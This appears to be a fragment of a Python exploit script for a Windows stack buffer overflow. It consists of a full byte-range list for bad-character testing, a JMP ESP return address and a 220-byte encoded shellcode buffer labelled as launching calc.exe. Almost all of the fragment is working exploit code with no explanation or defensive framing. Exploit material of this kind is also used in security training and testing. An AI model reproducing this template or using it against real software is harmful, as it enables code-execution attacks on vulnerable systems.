stringchars = (b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')

jmp = "\x2C\xB5\x22\x76" #7622B52C   FFE4             JMP ESP

#220bytes-x00x0ax0d-win32-calc.exe
buf =  "" 
buf += "\xda\xd7\xd9\x74\x24\xf4\xba\x07\xc8\xf9\x11\x5e\x2b"
buf += "\xc9\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xee\xfb\x2a"
buf += "\x0c\xed\xeb\x29\xef\x0e\xeb\x4d\x79\xeb\xda\x4d\x1d"
buf += "\x7f\x4c\x7e\x55\x2d\x60\xf5\x3b\xc6\xf3\x7b\x94\xe9"
buf += "\xb4\x36\xc2\xc4\x45\x6a\x36\x46\xc5\x71\x6b\xa8\xf4"
buf += "\xb9\x7e\xa9\x31\xa7\x73\xfb\xea\xa3\x26\xec\x9f\xfe"
buf += "\xfa\x87\xd3\xef\x7a\x7b\xa3\x0e\xaa\x2a\xb8\x48\x6c"
buf += "\xcc\x6d\xe1\x25\xd6\x72\xcc\xfc\x6d\x40\xba\xfe\xa7"
buf += "\x99\x43\xac\x89\x16\xb6\xac\xce\x90\x29\xdb\x26\xe3"
buf += "\xd4\xdc\xfc\x9e\x02\x68\xe7\x38\xc0\xca\xc3\xb9\x05"
buf += "\x8c\x80\xb5\xe2\xda\xcf\xd9\xf5\x0f\x64\xe5\x7e\xae"
buf += "\xab\x6c\xc4\x95\x6f\x35\x9e\xb4\x36\x93\x71\xc8\x29"
buf += "\x7c\x2d\x6c\x21\x90\x3a\x1d\x68\xfe\xbd\x93\x16\x4c"
buf += "\xbd\xab\x18\xe0\xd6\x9a\x93\x6f\xa0\x22\x76\xd4\x5e"
buf += "\x69\xdb\x7c\xf7\x34\x89\x3d\x9a\xc6\x67\x01\xa3\x44"
buf += "\x82\xf9\x50\x54\xe7\xfc\x1d\xd2\x1b\x8c\x0e\xb7\x1b"
buf += "\x23\x2e\x92\x7f\xa2\xbc\x7e\xae\x41\x45\xe4\xae"
